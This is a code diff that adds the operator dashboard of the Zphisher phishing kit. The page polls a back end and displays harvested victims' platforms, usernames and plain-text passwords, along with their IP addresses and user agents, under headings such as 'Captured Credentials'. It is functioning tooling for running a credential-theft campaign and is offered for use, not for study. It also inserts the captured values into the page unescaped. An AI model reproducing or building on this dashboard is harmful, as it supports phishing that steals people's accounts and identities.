@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zphisher Analytics Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #6366f1;
+            --primary-dark: #4f46e5;
+            --secondary: #0ea5e9;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --background: #111827;
+            --card-bg: #1f2937;
+            --text-primary: #f3f4f6;
+            --text-secondary: #9ca3af;
+            --border-color: #374151;
+            --hover-color: #2d3748;
+            --card-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.3), 0 4px 6px -2px rgba(0, 0, 0, 0.2);
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--background);
+            background-image: 
+                radial-gradient(circle at 25% 25%, rgba(99, 102, 241, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 75% 75%, rgba(14, 165, 233, 0.1) 0%, transparent 50%);
+            background-attachment: fixed;
+            background-size: 100% 100%;
+            color: var(--text-primary);
+        }
+        
+        .dashboard-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 1rem;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, rgba(99, 102, 241, 0.8) 0%, rgba(14, 165, 233, 0.8) 100%);
+            color: white;
+            padding: 1rem;
+            border-radius: 0 0 1rem 1rem;
+            box-shadow: var(--card-shadow);
+        }
+        
+        .card {
+            background: var(--card-bg);
+            border-radius: 1rem;
+            box-shadow: var(--card-shadow);
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            border: 1px solid var(--border-color);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3), 0 10px 10px -5px rgba(0, 0, 0, 0.2);
+        }
+        
+        .stat-card {
+            display: flex;
+            align-items: center;
+            overflow: hidden;
+        }
+        
+        .stat-icon {
+            border-radius: 1rem;
+            padding: 1rem;
+            margin-right: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 700;
+            line-height: 1;
+            margin-bottom: 0.25rem;
+            color: var(--text-primary);
+        }
+        
+        .stat-label {
+            color: var(--text-secondary);
+            font-size: 0.875rem;
+            font-weight: 500;
+        }
+        
+        .refresh-button {
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            border: none;
+            padding: 0.5rem 1.25rem;
+            border-radius: 0.5rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .refresh-button:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+        
+        .refresh-button svg {
+            transition: transform 0.5s ease;
+        }
+        
+        .refresh-button:hover svg {
+            transform: rotate(180deg);
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: separate;
+            border-spacing: 0;
+        }
+        th, td {
+            text-align: left;
+            padding: 1.25rem 1rem;
+        }
+        th {
+            text-transform: uppercase;
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+            letter-spacing: 0.05em;
+            border-bottom: 2px solid var(--border-color);
+            background: rgba(99, 102, 241, 0.08);
+        }
+        td {
+            color: var(--text-primary);
+            border-bottom: 1px solid var(--border-color);
+            vertical-align: top;
+        }
+        tr:last-child td {
+            border-bottom: none;
+        }
+        tr:nth-child(even) td {
+            background-color: rgba(31, 41, 55, 0.5);
+        }
+        tr:hover td {
+            background-color: var(--hover-color);
+        }
+        
+        .footer {
+            background: linear-gradient(135deg, rgba(17, 24, 39, 0.95) 0%, rgba(31, 41, 55, 0.95) 100%);
+            color: var(--text-primary);
+            padding: 1.5rem;
+            text-align: center;
+            border-radius: 1rem 1rem 0 0;
+            margin-top: 1.5rem;
+            border-top: 1px solid var(--border-color);
+        }
+        
+        .loading-indicator {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem;
+        }
+        
+        .loading-indicator svg {
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .section-title {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1.5rem;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 1rem;
+        }
+        
+        .section-title h2 {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+        
+        .section-title-icon {
+            margin-right: 0.75rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            color: white;
+            padding: 0.5rem;
+            border-radius: 0.5rem;
+        }
+        
+        .user-agent-cell {
+            /* max-width: 300px; */
+            /* overflow: hidden; */
+            /* text-overflow: ellipsis; */
+            /* white-space: nowrap; */
+            word-break: break-all;
+            white-space: normal;
+        }
+        
+        .select-styled {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 0.5rem;
+            padding: 0.5rem;
+            font-size: 0.875rem;
+            color: var(--text-primary);
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%239ca3af'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M19 9l-7 7-7-7'%3E%3C/path%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 0.5rem center;
+            background-size: 1.5rem;
+            padding-right: 2.5rem;
+        }
+        
+        .error-message {
+            background-color: rgba(239, 68, 68, 0.2);
+            border-left: 4px solid var(--danger);
+            color: #ef4444;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+            border-radius: 0.5rem;
+        }
+        
+        /* Glowing effects */
+        .glow-text {
+            text-shadow: 0 0 10px rgba(99, 102, 241, 0.5);
+        }
+        
+        .glow-border {
+            box-shadow: 0 0 15px rgba(99, 102, 241, 0.3);
+            border: 1px solid rgba(99, 102, 241, 0.5);
+        }
+        
+        /* Pulse animation for refresh */
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(99, 102, 241, 0.7);
+            }
+            70% {
+                box-shadow: 0 0 0 10px rgba(99, 102, 241, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(99, 102, 241, 0);
+            }
+        }
+        
+        .pulse-effect {
+            animation: pulse 1s ease-out;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+    <header class="header">
+        <div class="dashboard-container flex justify-between items-center">
+            <div class="flex items-center">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 mr-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+                    <line x1="12" y1="9" x2="12" y2="13"/>
+                    <line x1="12" y1="17" x2="12.01" y2="17"/>
+                </svg>
+                <h1 class="text-2xl font-bold glow-text">Zphisher Analytics Dashboard</h1>
+            </div>
+            <button id="refresh-btn" class="refresh-button">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M23 4v6h-6"/>
+                    <path d="M1 20v-6h6"/>
+                    <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/>
+                </svg>
+                Refresh
+            </button>
+        </div>
+    </header>
+
+    <main class="dashboard-container py-6 flex-grow">
+        <div id="error-message" class="error-message" style="display: none;">
+            <p id="error-text"></p>
+        </div>
+
+        <div class="card">
+            <div class="section-title">
+                <div class="section-title-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="3"/>
+                        <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/>
+                    </svg>
+                </div>
+                <h2>Dashboard Settings</h2>
+            </div>
+            <div class="flex items-center">
+                <label for="refresh-interval" class="mr-3 font-medium text-gray-300">Auto-refresh interval:</label>
+                <select id="refresh-interval" class="select-styled">
+                    <option value="1000">1 second</option>
+                    <option value="5000" selected>5 seconds</option>
+                    <option value="10000">10 seconds</option>
+                    <option value="30000">30 seconds</option>
+                    <option value="60000">1 minute</option>
+                </select>
+            </div>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-4 gap-6 mb-6">
+            <!-- Total Credentials Card -->
+            <div class="card stat-card glow-border">
+                <div class="stat-icon bg-indigo-900">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-indigo-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                        <circle cx="12" cy="7" r="4"/>
+                    </svg>
+                </div>
+                <div>
+                    <div class="stat-value glow-text" id="total-credentials">0</div>
+                    <div class="stat-label">Total Credentials</div>
+                </div>
+            </div>
+            
+            <!-- Unique IPs Card -->
+            <div class="card stat-card glow-border">
+                <div class="stat-icon bg-blue-900">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-blue-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10"/>
+                        <line x1="2" y1="12" x2="22" y2="12"/>
+                        <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
+                    </svg>
+                </div>
+                <div>
+                    <div class="stat-value glow-text" id="unique-ips">0</div>
+                    <div class="stat-label">Unique IPs</div>
+                </div>
+            </div>
+            
+            <!-- Platforms Card -->
+            <div class="card stat-card glow-border">
+                <div class="stat-icon bg-purple-900">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-purple-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>
+                    </svg>
+                </div>
+                <div>
+                    <div class="stat-value glow-text" id="platforms-count">0</div>
+                    <div class="stat-label">Platforms</div>
+                </div>
+            </div>
+            
+            <!-- Last Activity Card -->
+            <div class="card stat-card glow-border">
+                <div class="stat-icon bg-amber-900">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-amber-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10"/>
+                        <polyline points="12 6 12 12 16 14"/>
+                    </svg>
+                </div>
+                <div>
+                    <div class="stat-label">Last Activity</div>
+                    <div class="text-sm font-semibold truncate text-amber-300" id="last-activity">No activity</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+            <!-- Captured Credentials Card -->
+            <div class="card glow-border">
+                <div class="section-title">
+                    <div class="section-title-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                            <circle cx="12" cy="7" r="4"/>
+                        </svg>
+                    </div>
+                    <h2>Captured Credentials</h2>
+                </div>
+                <div class="overflow-x-auto">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Platform</th>
+                                <th>Username</th>
+                                <th>Password</th>
+                            </tr>
+                        </thead>
+                        <tbody id="credentials-table">
+                            <tr>
+                                <td colspan="3" class="text-center py-6">
+                                    <div class="loading-indicator">
+                                        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-gray-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                            <line x1="12" y1="2" x2="12" y2="6"/>
+                                            <line x1="12" y1="18" x2="12" y2="22"/>
+                                            <line x1="4.93" y1="4.93" x2="7.76" y2="7.76"/>
+                                            <line x1="16.24" y1="16.24" x2="19.07" y2="19.07"/>
+                                            <line x1="2" y1="12" x2="6" y2="12"/>
+                                            <line x1="18" y1="12" x2="22" y2="12"/>
+                                            <line x1="4.93" y1="19.07" x2="7.76" y2="16.24"/>
+                                            <line x1="16.24" y1="7.76" x2="19.07" y2="4.93"/>
+                                        </svg>
+                                    </div>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Captured IPs & User Agents Card -->
+            <div class="card glow-border">
+                <div class="section-title">
+                    <div class="section-title-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="12" cy="12" r="10"/>
+                            <line x1="2" y1="12" x2="22" y2="12"/>
+                            <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
+                        </svg>
+                    </div>
+                    <h2>Captured IPs & User Agents</h2>
+                </div>
+                <div class="overflow-x-auto">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>IP Address</th>
+                                <th>User Agent</th>
+                            </tr>
+                        </thead>
+                        <tbody id="ip-table">
+                            <tr>
+                                <td colspan="2" class="text-center py-6">
+                                    <div class="loading-indicator">
+                                        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-gray-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                            <line x1="12" y1="2" x2="12" y2="6"/>
+                                            <line x1="12" y1="18" x2="12" y2="22"/>
+                                            <line x1="4.93" y1="4.93" x2="7.76" y2="7.76"/>
+                                            <line x1="16.24" y1="16.24" x2="19.07" y2="19.07"/>
+                                            <line x1="2" y1="12" x2="6" y2="12"/>
+                                            <line x1="18" y1="12" x2="22" y2="12"/>
+                                            <line x1="4.93" y1="19.07" x2="7.76" y2="16.24"/>
+                                            <line x1="16.24" y1="7.76" x2="19.07" y2="4.93"/>
+                                        </svg>
+                                    </div>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="dashboard-container text-sm">
+            <p>Zphisher Analytics Dashboard • <Cc:noie></Cc:noie>Create by Marlee</p>
+        </div>
+    </footer>
+
+    <script>
+        // Variables
+        let credentials = [];
+        let ipData = [];
+        let refreshInterval = 5000;
+        let intervalId = null;
+
+        // DOM Elements
+        const refreshBtn = document.getElementById('refresh-btn');
+        const intervalSelect = document.getElementById('refresh-interval');
+        const errorMessage = document.getElementById('error-message');
+        const errorText = document.getElementById('error-text');
+        const totalCredentials = document.getElementById('total-credentials');
+        const uniqueIps = document.getElementById('unique-ips');
+        const platformsCount = document.getElementById('platforms-count');
+        const lastActivity = document.getElementById('last-activity');
+        const credentialsTable = document.getElementById('credentials-table');
+        const ipTable = document.getElementById('ip-table');
+
+        // Function to load data
+        async function loadData() {
+            try {
+                // Fetch all data at once
+                const response = await fetch('get_data.php');
+                const result = await response.json();
+                
+                if (!result.success) {
+                    errorText.textContent = result.errors.join(', ');
+                    errorMessage.style.display = 'block';
+                } else {
+                    // Hide any error messages
+                    errorMessage.style.display = 'none';
+                    
+                    // Update global variables
+                    credentials = result.credentials || [];
+                    ipData = result.ipData || [];
+                    
+                    // Update UI
+                    updateUI();
+                }
+            } catch (err) {
+                console.error('Error loading data:', err);
+                errorText.textContent = 'Failed to load data: ' + err.message;
+                errorMessage.style.display = 'block';
+            }
+        }
+
+        // Function to update UI with data
+        function updateUI() {
+            // Add animation to numbers
+            animateCounter(totalCredentials, credentials.length);
+            
+            const uniqueIPCount = new Set(ipData.map(entry => entry.ip)).size;
+            animateCounter(uniqueIps, uniqueIPCount);
+            
+            const platforms = new Set(credentials.map(cred => cred.platform));
+            animateCounter(platformsCount, platforms.size);
+            
+            // Update last activity
+            lastActivity.textContent = ipData.length > 0 ? 
+                new Date().toLocaleString() : 'No activity';
+            
+            // Create combined data
+            updateCombinedTable();
+        }
+        
+        // Animate counter
+        function animateCounter(element, targetValue) {
+            const duration = 500; // ms
+            const startValue = parseInt(element.textContent) || 0;
+            const startTime = performance.now();
+            
+            function updateCounter(currentTime) {
+                const elapsedTime = currentTime - startTime;
+                if (elapsedTime < duration) {
+                    const value = Math.round(startValue + (targetValue - startValue) * (elapsedTime / duration));
+                    element.textContent = value;
+                    requestAnimationFrame(updateCounter);
+                } else {
+                    element.textContent = targetValue;
+                }
+            }
+            
+            requestAnimationFrame(updateCounter);
+        }
+        
+        // Update the combined table view
+        function updateCombinedTable() {
+            if (credentials.length === 0 && ipData.length === 0) {
+                credentialsTable.innerHTML = `
+                    <tr>
+                        <td colspan="3" class="text-center py-6">
+                            <div class="loading-indicator">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-gray-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <line x1="12" y1="2" x2="12" y2="6"/>
+                                    <line x1="12" y1="18" x2="12" y2="22"/>
+                                    <line x1="4.93" y1="4.93" x2="7.76" y2="7.76"/>
+                                    <line x1="16.24" y1="16.24" x2="19.07" y2="19.07"/>
+                                    <line x1="2" y1="12" x2="6" y2="12"/>
+                                    <line x1="18" y1="12" x2="22" y2="12"/>
+                                    <line x1="4.93" y1="19.07" x2="7.76" y2="16.24"/>
+                                    <line x1="16.24" y1="7.76" x2="19.07" y2="4.93"/>
+                                </svg>
+                            </div>
+                        </td>
+                    </tr>
+                `;
+                ipTable.innerHTML = `
+                    <tr>
+                        <td colspan="2" class="text-center py-6">
+                            <div class="loading-indicator">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-gray-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <line x1="12" y1="2" x2="12" y2="6"/>
+                                    <line x1="12" y1="18" x2="12" y2="22"/>
+                                    <line x1="4.93" y1="4.93" x2="7.76" y2="7.76"/>
+                                    <line x1="16.24" y1="16.24" x2="19.07" y2="19.07"/>
+                                    <line x1="2" y1="12" x2="6" y2="12"/>
+                                    <line x1="18" y1="12" x2="22" y2="12"/>
+                                    <line x1="4.93" y1="19.07" x2="7.76" y2="16.24"/>
+                                    <line x1="16.24" y1="7.76" x2="19.07" y2="4.93"/>
+                                </svg>
+                            </div>
+                        </td>
+                    </tr>
+                `;
+                return;
+            }
+            
+            // Match credentials with IP data when possible
+            const combinedData = [];
+            
+            // Get the maximum number of rows needed
+            const maxEntries = Math.max(credentials.length, ipData.length);
+            
+            for (let i = 0; i < maxEntries; i++) {
+                const cred = i < credentials.length ? credentials[i] : null;
+                const ip = i < ipData.length ? ipData[i] : null;
+                
+                // Extract just the platform name without adding "Username"
+                const platformName = cred ? cred.platform : '';
+                
+                // For the username field, just use the raw username without adding "Pass"
+                const usernameValue = cred ? cred.username : '';
+                
+                combinedData.push({
+                    platform: platformName,
+                    username: usernameValue,
+                    password: cred ? cred.password : '',
+                    ip: ip ? ip.ip : '',
+                    userAgent: ip ? ip.userAgent : '',
+                });
+            }
+            
+            // Generate the table rows
+            credentialsTable.innerHTML = combinedData.map((entry, index) => `
+                <tr class="hover:bg-gray-800 transition-colors">
+                    <td class="font-medium ${entry.platform ? 'text-indigo-400' : 'text-gray-500'}">${entry.platform || '-'}</td>
+                    <td class="text-blue-300">${entry.username || '-'}</td>
+                    <td class="text-emerald-300">${entry.password || '-'}</td>
+                </tr>
+            `).join('');
+
+            ipTable.innerHTML = combinedData.map((entry, index) => `
+                <tr class="hover:bg-gray-800 transition-colors">
+                    <td class="text-amber-300">${entry.ip || '-'}</td>
+                    <td class="user-agent-cell text-gray-300" title="${entry.userAgent || '-'}">${entry.userAgent || '-'}</td>
+                </tr>
+            `).join('');
+        }
+
+        // Add button pulse effect
+        function addPulseEffect(button) {
+            button.classList.add('pulse-effect');
+            setTimeout(() => {
+                button.classList.remove('pulse-effect');
+            }, 500);
+        }
+
+        // Set up event listeners
+        refreshBtn.addEventListener('click', () => {
+            loadData();
+            addPulseEffect(refreshBtn);
+        });
+        
+        intervalSelect.addEventListener('change', () => {
+            refreshInterval = parseInt(intervalSelect.value, 10);
+            
+            // Clear existing interval and set new one
+            if (intervalId) {
+                clearInterval(intervalId);
+            }
+            
+            intervalId = setInterval(loadData, refreshInterval);
+        });
+
+        // Initial load
+        loadData();
+        
+        // Set up auto-refresh
+        intervalId = setInterval(loadData, refreshInterval);
+    </script>
+</body>
+</html>
